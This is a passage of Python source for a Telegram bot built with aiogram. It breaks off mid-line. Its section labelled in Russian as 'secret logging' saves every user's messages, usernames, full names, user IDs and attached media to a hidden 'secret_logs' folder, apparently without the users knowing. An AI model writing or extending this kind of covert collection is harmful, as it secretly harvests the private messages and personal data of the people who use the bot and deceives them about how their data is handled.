import os
import json
import uuid
import time
import asyncio
import zipfile
from typing import Dict, List, Tuple
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ContentType, InputFile

TOKEN = os.getenv("BOT_TOKEN")
Q_ADMIN = int(os.getenv("Q_ADMIN"))
TARGET_CHAT = int(os.getenv("TARGET_CHAT"))
TARGET_TOPIC = os.getenv("TARGET_TOPIC")
if TARGET_TOPIC:
    TARGET_TOPIC = int(TARGET_TOPIC)
else:
    TARGET_TOPIC = None

ADMINS = set()
_raw_admins = os.getenv("ADMINS", "")
if _raw_admins:
    try:
        ADMINS = set(map(int, filter(None, [s.strip() for s in _raw_admins.split(",")])))
    except:
        ADMINS = set()

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# ============================
# ✔️ СЕКРЕТНОЕ ЛОГИРОВАНИЕ
# ============================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "secret_logs")
os.makedirs(LOG_DIR, exist_ok=True)

async def secret_log(msg: types.Message):
    """Сохранение всех сообщений и медиа в secret_logs/"""

    user = msg.from_user
    uid = user.id
    username = user.username or "none"
    fullname = user.full_name
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    base_name = f"{timestamp}_{uid}"

    # ---- META ----
    meta_path = os.path.join(LOG_DIR, base_name + "_meta.txt")
    with open(meta_path, "w", encoding="utf-8") as f:
        f.write(f"DATE: {timestamp}\n")
        f.write(f"USER_ID: {uid}\n")
        f.write(f"USERNAME: @{username}\n")
        f.write(f"FULLNAME: {fullname}\n")
        f.write(f"TEXT: {msg.text or msg.caption or '—'}\n")

    # ---- Определяем медиа ----
    media_id = None
    ext = None

    if msg.photo:
        media_id = msg.photo[-1].file_id
        ext = ".jpg"
    elif msg.video:
        media_id = msg.video.file_id
        ext = ".mp4"
    elif msg.document:
        media_id = msg.document.file_id
        ext = "_" + msg.document.file_name
    elif msg.voice:
        media_id = msg.voice.file_id
        ext = ".ogg"
    elif msg.audio:
        media_id = msg.audio.file_id
        ext = ".mp3"
    elif msg.animation:
        media_id = msg.animation.fi_
    
